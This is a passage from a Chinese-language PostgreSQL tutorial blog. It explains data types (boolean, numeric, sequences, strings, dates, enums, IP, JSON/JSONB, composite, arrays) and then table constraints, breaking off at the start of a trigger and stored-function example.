<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 布尔类型的约束没有那么强，true，false大小写随意，他会给你转，同时yes，no这种他也认识，但是需要转换</span></span><br><span class="line"><span class="keyword">select</span> <span class="literal">true</span>,<span class="literal">false</span>,<span class="string">&#x27;yes&#x27;</span>::<span class="type">boolean</span>,<span class="type">boolean</span> <span class="string">&#x27;no&#x27;</span>,<span class="literal">True</span>,<span class="literal">FaLse</span>,<span class="keyword">NULL</span>::<span class="type">boolean</span>;</span><br></pre></td></tr></table></figure>

<p>boolean类型在做and和or的逻辑操作时的结果：</p>
<table>
<thead>
<tr>
<th>字段A</th>
<th>字段B</th>
<th>a and b</th>
<th>a or b</th>
</tr>
</thead>
<tbody><tr>
<td>true</td>
<td>true</td>
<td>true</td>
<td>true</td>
</tr>
<tr>
<td>true</td>
<td>false</td>
<td>false</td>
<td>true</td>
</tr>
<tr>
<td>true</td>
<td>NULL</td>
<td>NULL</td>
<td>true</td>
</tr>
<tr>
<td>false</td>
<td>false</td>
<td>false</td>
<td>false</td>
</tr>
<tr>
<td>false</td>
<td>NULL</td>
<td>false</td>
<td>NULL</td>
</tr>
<tr>
<td>NULL</td>
<td>NULL</td>
<td>NULL</td>
<td>NULL</td>
</tr>
</tbody></table>
<h1 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h1><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><p>整型比较简单，主要就是三个：</p>
<ul>
<li>smallint、int2：2字节</li>
<li>integer、int、int4：4字节</li>
<li>bigint、int8：8字节</li>
</ul>
<p>使用策略如下：</p>
<ul>
<li>正常就用integer；</li>
<li>如果要存主键，比如雪花算法，那就bigint；</li>
<li>要节约空间，就用smallint。</li>
</ul>
<h2 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h2><p>浮点类型就关注两个（其实是一个）</p>
<ul>
<li>decimal(n,m)：本质就是numeric，PostgreSQL会帮转换；</li>
<li>numeric(n,m)：PostgreSQL本质的浮点类型。</li>
</ul>
<p>针对浮点类型的数据，使用numeric即可。</p>
<h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><p>MySQL中的主键自增，是基于auto_increment去实现，没有序列的对象。</p>
<p>PostgreSQL和Oracle十分相似，支持序列：sequence，没有auto_increment。</p>
<p>序列的正常构建方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> sequence schema_oliver.table_id_seq;</span><br><span class="line"><span class="comment">-- 查询下一个值</span></span><br><span class="line"><span class="keyword">select</span> nextval(<span class="string">&#x27;schema_oliver.table_id_seq&#x27;</span>);</span><br><span class="line"><span class="comment">-- 查询当前值</span></span><br><span class="line"><span class="keyword">select</span> currval(<span class="string">&#x27;schema_oliver.table_id_seq&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>默认情况下，seqeunce的起始值是0，每次nextval递增1，最大值9223372036854775807；</li>
<li>告诉缓存，插入的数据比较多，可以指定告诉缓存，一次性计算出20个后续的值，nextval时，就不可以不去计算，直接去高速缓存拿值，效率会有一内内的提升；</li>
<li>序列大多数的应用，是用作表的主键自增效果。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 表自增</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> schema_oliver.xxx(</span><br><span class="line">    id int8 <span class="keyword">default</span> nextval(<span class="string">&#x27;schema_oliver.table_id_seq&#x27;</span>),</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">16</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> schema_oliver.xxx (name) <span class="keyword">values</span> (<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> schema_oliver.xxx;</span><br></pre></td></tr></table></figure>

<p>上面这种写法没有问题，但是很麻烦。</p>
<p>PostgreSQL提供了序列的数据类型，可以在声明表结构时，直接指定序列的类型即可。</p>
<p>bigserial相当于是bigint类型设置了序列实现自增。</p>
<p>类型对应如下：</p>
<ul>
<li>smallserial对应smallint；</li>
<li>serial对应int；</li>
<li>bigserial对应bigint。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 表自增</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> schema_oliver.yyy(</span><br><span class="line">    id bigserial,   </span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">16</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> schema_oliver.yyy (name) <span class="keyword">values</span> (<span class="string">&#x27;yyy&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>在drop表之后，序列不会被删除，但是序列会变为不可用的状态。 因为序列在使用serial去构建时，会绑定到指定表的指定列上。</li>
<li>如果是单独构建序列，再构建表，使用传统方式实现，序列和表就是相对独立的。</li>
</ul>
<h2 id="数值的常见操作"><a href="#数值的常见操作" class="headerlink" title="数值的常见操作"></a>数值的常见操作</h2><p>针对数值可以实现加减乘除取余这5个操作</p>
<p>还有其他的操作方式</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>幂</td>
<td>2 ^ 3</td>
<td>8</td>
</tr>
<tr>
<td>|&#x2F;</td>
<td>平方根</td>
<td>|&#x2F; 36</td>
<td>6</td>
</tr>
<tr>
<td>@</td>
<td>绝对值</td>
<td>@ -5</td>
<td>5</td>
</tr>
<tr>
<td>&amp;</td>
<td>与</td>
<td>31 &amp; 16</td>
<td>16</td>
</tr>
<tr>
<td>|</td>
<td>或</td>
<td>31|32</td>
<td>63</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左移</td>
<td>1&lt;&lt;1</td>
<td>2</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右移</td>
<td>16&gt;&gt;1</td>
<td>8</td>
</tr>
</tbody></table>
<p>数值操作也提供了一些函数，比如pi()，round(数值, 位数)，floor()，ceil()</p>
<h1 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h1><p>字符串类型用的是最多的一种，在PostgreSQL里，主要支持三种：</p>
<ul>
<li>character（就是MySQL的char类型），定长字符串。（最大可以存储1G）</li>
<li>character varying（varchar），可变长度的字符串。（最大可以存储1G）</li>
<li>text（跟MySQL一样）长度特别长的字符串。</li>
</ul>
<p>注意： 字符串的拼接一要要使用||来拼接。</p>
<p>其他的函数，可以查看：<a href="http://www.postgres.cn/docs/12/functions-string.html">http://www.postgres.cn/docs/12/functions-string.html</a></p>
<h1 id="日期类型"><a href="#日期类型" class="headerlink" title="日期类型"></a>日期类型</h1><p>在PostgreSQL中，核心的时间类型，就三个。</p>
<ul>
<li>timestamp（时间戳，年月日时分秒）</li>
<li>date（年月日）</li>
<li>time（时分秒）</li>
</ul>
<p>在PostgreSQL中，声明时间的方式。</p>
<p>只需要使用字符串正常的编写 yyyy-MM-dd HH:mm:ss 就可以转换为时间类型。</p>
<p>直接在字符串位置使用之前讲到的数据类型转换就可以了。</p>
<p>当前系统时间：</p>
<ul>
<li>可以使用now作为当前系统时间（没有时区的概念）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select timestamp &#x27;now&#x27;;</span><br><span class="line">-- 直接查询now，没有时区的概念</span><br><span class="line">select time with time zone &#x27;now&#x27; at time zone &#x27;08:00:00&#x27;</span><br></pre></td></tr></table></figure></li>
<li>也可以使用current_timestamp的方式获取（推荐，默认东八区）</li>
</ul>
<p>日期类型的运算：</p>
<ul>
<li>正常对date类型做+，-操作，默认单位是天</li>
<li>date + time &#x3D; timestamp~~~<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select date &#x27;2011-11-11&#x27; + time &#x27;12:12:12&#x27; ;</span><br></pre></td></tr></table></figure></li>
<li>可以针对timestamp使用interval的方式进行 +,- 操作，在查询以时间范围为条件的内容时，可以使用<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select timestamp &#x27;2011-11-11 12:12:12&#x27; + interval &#x27;1day&#x27; + interval &#x27;1minute&#x27; + interval &#x27;1month&#x27;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h1><p>枚举类型MySQL也支持，只是没使用，PostgreSQL同样支持这种数据类型</p>
<p>可以声明枚举类型作为表中的字段类型，这样可以无形的给表字段追加规范。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 声明一个星期的枚举，值自然只有周一~周日。</span></span><br><span class="line"><span class="keyword">create</span> type week <span class="keyword">as</span> enum (<span class="string">&#x27;Mon&#x27;</span>,<span class="string">&#x27;Tues&#x27;</span>,<span class="string">&#x27;Sun&#x27;</span>);</span><br><span class="line"><span class="comment">-- 声明一张表，表中的某个字段的类型是上面声明的枚举。</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    id bigserial ,</span><br><span class="line">    weekday week</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (weekday) <span class="keyword">values</span> (<span class="string">&#x27;Mon&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (weekday) <span class="keyword">values</span> (<span class="string">&#x27;Fri&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241011/c9f7bbd91c034952992f81aa701f8d98.png" alt="枚举异常"></p>
<h1 id="IP类型"><a href="#IP类型" class="headerlink" title="IP类型"></a>IP类型</h1><p>PostgreSQL支持IP类型的存储，支持IPv4，IPv6，甚至MAC地址类型也支持。</p>
<p>IP类型，可以在存储IP时，帮助做校验，其次也可以针对IP做范围查找。</p>
<p>IP校验：</p>
<p><img src="/./assets/20241011/afe45596b7f1417fb87f76510ec6d175.png" alt="IP校验"></p>
<p>IP范围查找：</p>
<p><img src="/./assets/20241011/d8873d97b4ec4123b5c27a4dd57371bb.png" alt="IP范围查找"></p>
<h1 id="JSON-JSONB类型"><a href="#JSON-JSONB类型" class="headerlink" title="JSON&amp;JSONB类型"></a>JSON&amp;JSONB类型</h1><p>JSON在MySQL8.x中也做了支持，但是MySQL支持的不好，因为JSON类型做查询时，基本无法给JSON字段做索引。</p>
<p>PostgreSQL支持JSON类型以及JSONB类型，JSON和JSONB的使用基本没区别。</p>
<p>抛开JSON类型，本质上JSON格式就是一个字符串，比如MySQL5.7不支持JSON的情况的下，使用text也可以，但是字符串类型无法校验JSON的格式，单独的字符串也没有办法只获取JSON中某个key对应的value。</p>
<p>JSON和JSONB的区别：</p>
<ul>
<li>JSON类型无法构建索引，JSONB类型可以创建索引；</li>
<li>JSON类型的数据中多余的空格会被存储下来，JSONB会自动取消多余的空格；</li>
<li>JSON类型甚至可以存储重复的key，JSONB不会保留多余的重复key（只保留最后一个）；</li>
<li>JSON会保留存储时key的顺序，JSONB不会保留原有顺序。</li>
</ul>
<p>JSON中key对应的value的数据类型</p>
<table>
<thead>
<tr>
<th>JSON</th>
<th>PostgreSQL</th>
</tr>
</thead>
<tbody><tr>
<td>String</td>
<td>text</td>
</tr>
<tr>
<td>number</td>
<td>numeric</td>
</tr>
<tr>
<td>boolean</td>
<td>boolean</td>
</tr>
<tr>
<td>null</td>
<td>(none)</td>
</tr>
</tbody></table>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>操作JSON：</p>
<ul>
<li>上述的四种JSON存储的类型：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;9&#x27;::JSON,&#x27;null&#x27;::JSON,&#x27;&quot;oliver&quot;&#x27;::JSON,&#x27;true&#x27;::json;</span><br><span class="line">select &#x27;9&#x27;::JSONB,&#x27;null&#x27;::JSONB,&#x27;&quot;oliver&quot;&#x27;::JSONB,&#x27;true&#x27;::JSONB;</span><br></pre></td></tr></table></figure></li>
<li>JSON数组<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;[9,true,null,&quot;我是字符串&quot;]&#x27;::JSON;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/./assets/20241011/d9e02e3db28c45dfb6916a12a74229d0.png" alt="JSON对象"></p>
<ul>
<li>JSON对象<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&#123;&quot;name&quot;: &quot;张三&quot;,&quot;age&quot;: 23,&quot;birthday&quot;: &quot;2011-11-11&quot;,&quot;gender&quot;: null&#125;&#x27;::json;</span><br><span class="line">select &#x27;&#123;&quot;name&quot;: &quot;张三&quot;,&quot;age&quot;: 23,&quot;birthday&quot;: &quot;2011-11-11&quot;,&quot;gender&quot;: null&#125;&#x27;::jsonb;</span><br></pre></td></tr></table></figure></li>
<li>构建表存储JSON<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table test(</span><br><span class="line">    id bigserial,</span><br><span class="line">    info json,</span><br><span class="line">    infob jsonb</span><br><span class="line">);</span><br><span class="line">insert into</span><br><span class="line">  test</span><br><span class="line">(info,infob)   </span><br><span class="line">  values </span><br><span class="line">(&#x27;&#123;&quot;name&quot;:            &quot;张三&quot;              ,&quot;age&quot;: 23,&quot;birthday&quot;: &quot;2011-11-11&quot;,&quot;gender&quot;: null&#125;&#x27;,</span><br><span class="line">&#x27;&#123;&quot;name&quot;:               &quot;张三&quot;             ,&quot;age&quot;: 23,&quot;birthday&quot;: &quot;2011-11-11&quot;,&quot;gender&quot;: null&#125;&#x27;)</span><br><span class="line">select * from test;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/./assets/20241011/998c78f42473438f8697b2f79d72a6a4.png" alt="JSON构建索引"></p>
<ul>
<li>构建索引的效果<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create index json_index on test(info);</span><br><span class="line">create index jsonb_index on test(infob);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>JSON还支持很多函数，可以在文档中查询：<a href="http://www.postgres.cn/docs/12/functions-json.html">http://www.postgres.cn/docs/12/functions-json.html</a></p>
<h1 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h1><p>复合类型就好像Java中的一个对象，Java中有一个User，User和表做了一个映射，User中有个人信息对象，基于符合类型映射个人信息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Integer id;</span><br><span class="line">   <span class="keyword">private</span> Info info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照上面的情况，将Info构建成一个复合类型</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 构建复合类型，映射上Info</span></span><br><span class="line"><span class="keyword">create</span> type type_info <span class="keyword">as</span> (name <span class="type">varchar</span>(<span class="number">32</span>),age <span class="type">int</span>);</span><br><span class="line"><span class="comment">-- 构建表，映射User</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user(</span><br><span class="line">    id serial,</span><br><span class="line">    info type_info</span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 添加数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user (info) <span class="keyword">values</span> ((<span class="string">&#x27;张三&#x27;</span>,<span class="number">23</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user (info) <span class="keyword">values</span> ((<span class="string">&#x27;露丝&#x27;</span>,<span class="number">233</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user (info) <span class="keyword">values</span> ((<span class="string">&#x27;jack&#x27;</span>,<span class="number">33</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user (info) <span class="keyword">values</span> ((<span class="string">&#x27;李四&#x27;</span>,<span class="number">24</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_user;</span><br></pre></td></tr></table></figure>

<h1 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h1><p>数组还是要依赖其他类型，比如在设置住址，住址可能有多个住址，可以采用数组类型去修饰字符串。</p>
<p>PostgreSQL中，指定数组的方式就是[]，可以指定一维数组，也支持二维甚至更多维数组。</p>
<p>构建数组的方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    id serial,</span><br><span class="line">    col1 <span class="type">int</span>[],</span><br><span class="line">    col2 <span class="type">int</span>[<span class="number">2</span>],</span><br><span class="line">    col3 <span class="type">int</span>[][]</span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 构建表指定数组长度后，并不是说数组内容只有2的长度，可以插入更多数据</span></span><br><span class="line"><span class="comment">-- 甚至在插入数据，如果将二维数组结构的数组扔到一维数组上，也可以存储。</span></span><br><span class="line"><span class="comment">-- 数组编写方式</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&#123;&#123;how,are&#125;,&#123;are,you&#125;&#125;&#x27;</span>::<span class="type">varchar</span>[];</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>[[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]];</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (col1,col2,col3) <span class="keyword">values</span> (<span class="string">&#x27;&#123;1,2,3&#125;&#x27;</span>,<span class="string">&#x27;&#123;4,5,6&#125;&#x27;</span>,<span class="string">&#x27;&#123;7,8,9&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (col1,col2,col3) <span class="keyword">values</span> (<span class="string">&#x27;&#123;1,2,3&#125;&#x27;</span>,<span class="string">&#x27;&#123;4,5,6&#125;&#x27;</span>,<span class="keyword">array</span>[[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]]);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (col1,col2,col3) <span class="keyword">values</span> (<span class="string">&#x27;&#123;1,2,3&#125;&#x27;</span>,<span class="string">&#x27;&#123;4,5,6&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#123;1,2&#125;,&#123;3,4&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;</span><br></pre></td></tr></table></figure>

<p>其他特殊情况？</p>
<ul>
<li>如果要存储字符串数组？</li>
<li>如果存储的数组中有双引号怎么办？</li>
<li>如果有大括号怎么办？</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 如果存储的数组中的值，有单引号怎么办？</span></span><br><span class="line"><span class="comment">-- 使用两个单引号，作为一个单引号使用</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&#123;&#x27;&#x27;how&#x27;&#x27;&#125;&#x27;</span>::<span class="type">varchar</span>[];</span><br><span class="line"><span class="comment">-- 如果存储的数组中的值，有逗号怎么办？(PGSQL中的数组索引从1开始算，写0也是从1开始算。)</span></span><br><span class="line"><span class="comment">-- 用双引号将数组的数据包起来~</span></span><br><span class="line"><span class="keyword">select</span> (<span class="string">&#x27;&#123;&quot;how,are&quot;&#125;&#x27;</span>::<span class="type">varchar</span>[])[<span class="number">2</span>];</span><br><span class="line"><span class="comment">-- 如果存储的数组中的值，有双引号怎么办？</span></span><br><span class="line"><span class="comment">-- 如果要添加双引号，记得转义。</span></span><br><span class="line"><span class="keyword">select</span> (<span class="string">&#x27;&#123;&quot;\&quot;how\&quot;,are&quot;&#125;&#x27;</span>::<span class="type">varchar</span>[])[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>数组的比较方式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 包含</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>[<span class="number">1</span>,<span class="number">2</span>] @<span class="operator">&gt;</span> <span class="keyword">array</span>[<span class="number">1</span>];</span><br><span class="line"><span class="comment">-- 被包含</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>[<span class="number">1</span>,<span class="number">2</span>] <span class="operator">&lt;</span>@ <span class="keyword">array</span>[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>];</span><br><span class="line"><span class="comment">-- 是否有相同元素</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">array</span>[<span class="number">2</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">45</span>,<span class="number">1</span>] <span class="operator">&amp;&amp;</span> <span class="keyword">array</span>[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL中的表</title>
    <url>/2024/10/11/20241011-04.html</url>
    <content><![CDATA[<p>表的构建语句，比较简单。 核心在构建表时，要指定上一些约束。</p>
<h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h1><h2 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 主键约束</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    id bigserial <span class="keyword">primary</span> key ,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">32</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="非空"><a href="#非空" class="headerlink" title="非空"></a>非空</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 非空约束</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    id bigserial <span class="keyword">primary</span> key ,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="唯一"><a href="#唯一" class="headerlink" title="唯一"></a>唯一</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    id bigserial <span class="keyword">primary</span> key ,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    id_card <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">unique</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (name,id_card) <span class="keyword">values</span> (<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;333333333333333333&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (name,id_card) <span class="keyword">values</span> (<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;333333333333333333&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (name,id_card) <span class="keyword">values</span> (<span class="keyword">NULL</span>,<span class="string">&#x27;433333333333333333&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 检查约束</span></span><br><span class="line"><span class="comment">-- 价格的表，price，discount_price</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    id bigserial <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    price <span class="type">numeric</span> <span class="keyword">check</span>(price <span class="operator">&gt;</span> <span class="number">0</span>),</span><br><span class="line">    discount_price <span class="type">numeric</span> <span class="keyword">check</span>(discount_price <span class="operator">&gt;</span> <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">check</span>(price <span class="operator">&gt;=</span> discount_price)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test (name,price,discount_price) <span class="keyword">values</span> (<span class="string">&#x27;粽子&#x27;</span>,<span class="number">122</span>,<span class="number">12</span>);</span><br></pre></td></tr></table></figure>

<h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><p>用不到，这个不介绍，可以看文档学。</p>
<h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><p>一般公司内，要求表中除了主键和业务字段之外，必须要有5个字段</p>
<p>created，create_id，updated，update_id，is_delete</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 默认值</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    id bigserial <span class="keyword">primary</span> key,</span><br><span class="line">    created <span class="type">timestamp</span> <span class="keyword">default</span> <span class="built_in">current_timestamp</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h1><p>触发器Trigger，是由事件出发的一种存储过程</p>
<p>当对标进行insert，update，delete，truncate操作时，会触发表的Trigger。</p>
<p>构建两张表，学生信息表，学生分数表。</p>
<p>在删除学生信息的同时，自动删除学生的分数。</p>
<p>先构建表信息，填充数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">32</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> score(</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    student_id <span class="type">int</span>,</span><br><span class="line">    math_score <span class="type">numeric</span>,</span><br><span class="line">    english_score <span class="type">numeric</span>,</span><br><span class="line">    chinese_score <span class="type">numeric</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (id,name) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (id,name) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">    score</span><br><span class="line">(id,student_id,math_score,english_score,chinese_score)</span><br><span class="line">    <span class="keyword">values</span></span><br><span class="line">(<span class="number">1</span>,<span class="number">1</span>,<span class="number">66</span>,<span class="number">66</span>,<span class="number">66</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">    score</span><br><span class="line">(id,student_id,math_score,english_score,chinese_score)</span><br><span class="line">    <span class="keyword">values</span></span><br><span class="line">(<span class="number">2</span>,<span class="number">2</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">55</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> score;</span><br></pre></td></tr></table></figure>

<p>为了完成级联删除的操作，需要编写pl&#x2F;sql。</p>
<p>先查看一下PGSQL支持的plsql，查看一下PostgreSQL的plsql语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[ <span class="operator">&lt;&lt;</span>label<span class="operator">&gt;&gt;</span> ]</span><br><span class="line">[ <span class="keyword">DECLARE</span></span><br><span class="line">    declarations ]</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    statements</span><br><span class="line"><span class="keyword">END</span> [ label ];</span><br></pre></td></tr></table></figure>

<p>构建一个存储函数，测试一下plsql</p>
